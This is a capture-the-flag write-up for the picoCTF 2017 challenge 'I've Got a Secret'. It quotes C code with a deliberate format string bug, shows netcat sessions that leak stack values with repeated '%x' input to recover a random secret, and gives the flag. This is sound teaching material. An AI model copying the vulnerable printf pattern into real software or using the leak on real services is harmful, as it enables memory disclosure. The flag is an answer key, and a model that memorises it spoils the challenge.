## I've Got a Secret - 75

### Description

Hopefully you can find the right format for my [secret](./secret)! [Source](./secret.c). Connect on shell2017.picoctf.com:58570.

### Hint

  - This is a beginning format string attack.

### Write up

```c
int fd = open("/dev/urandom", O_RDONLY);
if(fd == -1){
    puts("Open error on /dev/urandom. Contact an admin\n");
    return -1;
}
int secret;
if(read(fd, &secret, sizeof(int)) != sizeof(int)){
    puts("Read error. Contact admin!\n");
    return -1;
}
```

The program reads `secret` value from /dev/urandom, which is actually random.

```c
int not_secret;
printf("Now tell my secret in hex! Secret: ");
fflush(stdout);
scanf("%x", &not_secret);
if(secret == not_secret){
    puts("Wow, you got it!");
    system("cat ./flag.txt");   
}else{
    puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
}
```

And we must guess it correctly.

```c
printf("Give me something to say!\n");
fflush(stdout);
fgets(buffer, BUF_LEN, stdin);
printf(buffer);
```

Where we can attack is here. The program gets string from user and print it.

Buf `printf(buffer)` triggers format string bug.

    $ nc localhost 58570
    Give me something to say!
    %x %x %x %x %x %x %x %x %x %x
    40 f7fc7c20 8048792 1 ffffdd34 3ccfcaf5 3 f7fc73c4 ffffdca0 0

    $ nc localhost 58570
    Give me something to say!
    %x %x %x %x %x %x %x %x %x %x
    40 f7fc7c20 8048792 1 ffffdd34 7651656a 3 f7fc73c4 ffffdca0 0

If we send format string as a input, we can leak the memory stack.

Each time we execute the program, 6th output changes. So that must be `secret` value.

    $ nc localhost 58570
    Give me something to say!
    %x %x %x %x %x %x %x %x %x %x
    40 f7fc7c20 8048792 1 ffffdd34 7651656a 3 f7fc73c4 ffffdca0 0
    Now tell my secret in hex! Secret: 7651656a
    326edd4743c7046d72d29e911ae8a412
    Wow, you got it!

> 326edd4743c7046d72d29e911ae8a412
